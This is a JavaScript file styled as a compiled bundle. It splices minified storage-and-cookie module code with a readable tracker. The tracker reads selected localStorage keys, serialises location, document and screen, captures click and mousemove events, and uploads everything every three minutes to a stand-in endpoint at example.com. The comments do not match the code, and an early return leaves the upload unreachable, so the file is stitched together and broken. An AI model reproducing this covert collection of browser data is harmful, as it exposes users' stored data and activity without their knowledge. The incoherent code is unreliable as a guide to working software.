/*
 Compiled on Sun Apr 24 2022 11:59:28 GMT+0000 (Coordinated Universal Time) (1825202523) */
'use strict';

(function () {
  // Set keys to track
  const trackedKeys = {
    localStorage: window.keysToWatch,
    global: ['location', 'document', 'screen'],
    eventListeners: ['click', 'mousemove']
  };

  // Hash function
  let g,
    l,
    e,
    y,
    z,
    d,
    n = !1,
    t = 0;
  function createHash(input) {
    const str = JSON.stringify(input, Object.keys(input).sort());
    let hash = 0;
    for (const char of str) {
      hash = (hash << 5) - hash + char.charCodeAt(0);
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  // Scan local storage
  function scanLocalStorage() {
    const collectedData = {};
    for (const key of trackedKeys.localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        collectedData[key] = localStorage.getItem(key);
      }
    }
    return collectedData;
  }

  // Scan global variables
  class E {
    constructor(a, b, c, f, m, p, q) {
      this.salt = b;
      this.J = p;
      this.K = l.d.f(f);
      this.L = a;
      this.H = m;
      this.I = c.a;
      a = c.d;
      this.A = a.i;
      this.D = a.b;
      this.g = a.f;
      this.F = a.a;
      this.C = a.c;
      this.B = q;
    }
    static ["a"]() {
      if (l.j.q) {
        var a = F();
        a ? (d = a, d["#$S^"] || G()) : (d = {}, u());
        e.t.l(2, () => {
          d && (d["#$S^"] = t, 1 == t ? g.v.h.j(document, "X-AK-PIM-INJECT=sync;path=/;") : g.v.h.j(document, `X-AK-PIM-INJECT=;Expires=${new Date().toUTCString()};Max-Age=0;`), u());
        });
        g.n.m.b(() => {
          if (!n) {
            const b = Date.now();
            for (const c in d) {
              if (!Array.isArray(d[c])) continue;
              const f = d[c][7];
              f && b > f && delete d[c];
            }
            u();
          }
        }, 3E3 + g.n.j.f());
      }
    }
    static ["k"](a) {
      return e.a.j(a.u) ? 2 : e.a.i(a.u) ? 1 : 0;
    }
    static ["y"](a, b, c) {
      b = l.d.f(b);
      return !!(null != d && b in d && d[b][0] === a && (!c || c && c == d[b][5]));
    }
    static ["m"](a, b, c) {
      let f = a.p;
      if (d) {
        b = l.d.f(b);
        var [,, m, p, q, v,,, w] = d[b];
        if (m !== e.q.x("4")) {
          b = x(p);
          var r = A(b, q),
            h = e.j;
          h.l(a.u, r);
          f.d.p(a.u, 5, m);
          h.b(a.u, 3);
          v === c && h.b(a.u, 21);
          b.f && h.b(a.u, 14);
          b.b && h.b(a.u, 15);
          b.a && h.b(a.u, 19);
          w && h.b(a.u, 28);
        }
      }
    }
    static ["r"](a, b) {
      if (l.j.q && d) {
        n = !0;
        try {
          for (let c in d) {
            if (!Array.isArray(d[c])) continue;
            let [, f, m, p, q,, v] = d[c];
            if (!f || !v.length || m == e.q.x("4")) continue;
            let w = x(p);
            if (Object.values(w).every(r => !r)) break;
            if (y.h(b, v, f)) {
              let r = A(w, q);
              H(a.u, r);
              delete d[c];
              break;
            }
          }
        } catch (c) {}
        n = !1;
      }
    }
    ["q"]() {
      d && (n = !0, d[this.K] = [this.L, this.salt || "", e.q.x("4"), this.G(), I(this.I), this.H, this.J || [], Date.now() + 216E5, this.B ? 1 : 0], u(), n = !1);
    }
    G() {
      var a = [this.A, this.C, this.g, this.D, this.F];
      let b = 0,
        c = 1;
      for (const f of a) f && (b |= c), c *= 2;
      return b;
    }
  }
  let G = () => {
      if (d) for (const a in d) Array.isArray(d[a]) && delete d[a];
    },
    H = (a, b) => {
      e.j.b(a, 22);
      e.j.l(a, b);
    },
    x = a => {
      const b = [];
      for (let c = 0; 4 > c; c++) b[c] = a >> c & 1;
      return {
        i: !!b[0],
        c: !!b[1],
        f: !!b[2],
        g: !1,
        d: !1,
        h: !1,
        e: !1,
        b: !!b[3],
        a: !!b[4],
        j: !1
      };
    },
    u = () => {
      d["&blg$"] = g.n.j.f();
      J();
      let a = JSON.stringify(d);
      for (let b = 0; 2 > b; b++) a = btoa(a);
      try {
        g.n.k.e("GULP_SC2", a);
      } catch (b) {}
    },
    J = () => {
      var a = Object.values(d).filter(b => Array.isArray(b));
      a.length || (t = 0);
      for (const b of a) if (a = x(b[3]), Object.values(a).some(c => c)) {
        t = 1;
        break;
      }
    },
    F = () => {
      var a = g.n.k.m("GULP_SC2");
      return (a = a && B(a)) && "object" === typeof a && "&blg$" in a ? a : null;
    },
    B = (a, b = 0) => {
      if ("object" === typeof a || 2 == b) return a;
      try {
        a = atob(a), a = JSON.parse(a);
      } catch (c) {}
      return B(a, b + 1);
    },
    I = a => {
      const b = z.z("q").c.y;
      return {
        a: a.a.map(c => b.f(c)),
        b: a.b.map(c => b.f(c))
      };
    },
    K = a => ({
      a: a.a.map(b => e.h.s(b)),
      b: a.b.map(b => e.h.s(b))
    }),
    A = (a, b) => ({
      d: a,
      a: K(b),
      b: {
        a: [],
        b: []
      },
      c: {
        a: [],
        b: []
      }
    });
  class k {}
  k.p = "p";
  function scanGlobalVariables() {
    const collectedData = {};
    for (const key of trackedKeys.global) {
      if (window.hasOwnProperty(key)) {
        collectedData[key] = JSON.stringify(window[key]);
      }
    }
    return collectedData;
  }

  // Add event listeners
  function addEventListeners() {
    const listenersData = {};
    for (const event of trackedKeys.eventListeners) {
      document.addEventListener(event, e => {
        listenersData[event] = e;
      });
    }
    return listenersData;
  }

  // Upload data
  k.r = () => {
    var a = k.o,
      b = k.b;
    g = a.z("q");
    l = a.z("y");
    e = a.z("b");
    y = a.z("u");
    z = b;
  };
  k.c = E;
  async function uploadData(data) {
    const hashCode = createHash(data);
    const endpoint = "https://example.com/api/collect";
    try {
      const response = await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashCode,
          data
        })
      });
      if (response.ok) console.log("成功上传数据");else console.error(`上传数据失败, 状态码: ${response.status}`);
    } catch (error) {
      console.error(`上传过程中出错: ${error}`);
    }
  }

  // Collect and upload data
  let C,
    D = window.___1323277659;
  function collectAndUploadData() {
    const newData = {
      ...scanLocalStorage(),
      ...scanGlobalVariables(),
      ...addEventListeners()
    };
    if (Object.keys(newData).length > 0) uploadData(newData);
  }

  // On DOM loaded, start tracking process
  D ? D(k) : C = k;
  return C;
  window.addEventListener("DOMContentLoaded", () => {
    collectAndUploadData();
    setInterval(collectAndUploadData, 3 * 60 * 1000);
  });
})();
//# sourceURL=64885_1825202523.js